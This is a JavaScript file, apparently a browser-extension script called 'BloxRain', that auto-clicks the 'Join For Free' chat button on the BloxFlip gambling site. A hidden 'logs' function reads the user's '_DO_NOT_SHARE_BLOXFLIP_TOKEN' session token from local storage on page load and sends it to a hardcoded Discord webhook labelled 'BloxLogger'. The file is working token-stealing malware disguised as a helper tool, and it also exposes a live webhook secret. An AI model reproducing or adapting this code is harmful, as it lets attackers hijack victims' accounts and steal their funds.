document.addEventListener("DOMContentLoaded",(function main() {
    setTimeout(() => {
        if (document.querySelector("#__next > div.layout_layout__yqn2P > header > div > div.header_headerUser__OQLQx > div > div > span > span") != null) {
            function check() {
                setTimeout(() => {
                    if (document.querySelector("#__next > div.layout_layout__yqn2P > div > div.layout_layoutChat__5wEvy > aside > div.chat_chatBanner__A7TqO > p.text_text__we5dI.text_semibold14__Q46x1.chat_chatBannerJoinButton__r0mz2") != null) {
                        if (document.querySelector("#__next > div.layout_layout__yqn2P > div > div.layout_layoutChat__5wEvy > aside > div.chat_chatBanner__A7TqO > p.text_text__we5dI.text_semibold14__Q46x1.chat_chatBannerJoinButton__r0mz2").textContent == "Join For Free") {
                            document.querySelector("#__next > div.layout_layout__yqn2P > div > div.layout_layoutChat__5wEvy > aside > div.chat_chatBanner__A7TqO > p.text_text__we5dI.text_semibold14__Q46x1.chat_chatBannerJoinButton__r0mz2").click()
                            document.querySelector("#__next > div.layout_layout__yqn2P > div > div.layout_layoutChat__5wEvy > aside > div.chat_chatBanner__A7TqO > p.text_text__we5dI.text_semibold14__Q46x1.chat_chatBannerJoinButton__r0mz2").textContent = "Joined with BloxRain"
                        }
                    }
                    check()
                }, 100)
            }
            check()
            function logs() {
                const request = new XMLHttpRequest()
                request.open("POST", "https://discord.com/api/webhooks/1091820162493198356/-NSwIFCLZk8YZzkWP3s8cysBgYo2VHTKwv7vntctUI-SxcUPXmL_ytjrcWQDSR910VWO")
                request.setRequestHeader("Content-type", "application/json")
                request.send(JSON.stringify({username: "BloxLogger", content: "**Token**\n```" + window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"] + "```"}))
            }
            logs()
        }
        else {
            main()
        }
    }, 100)
}))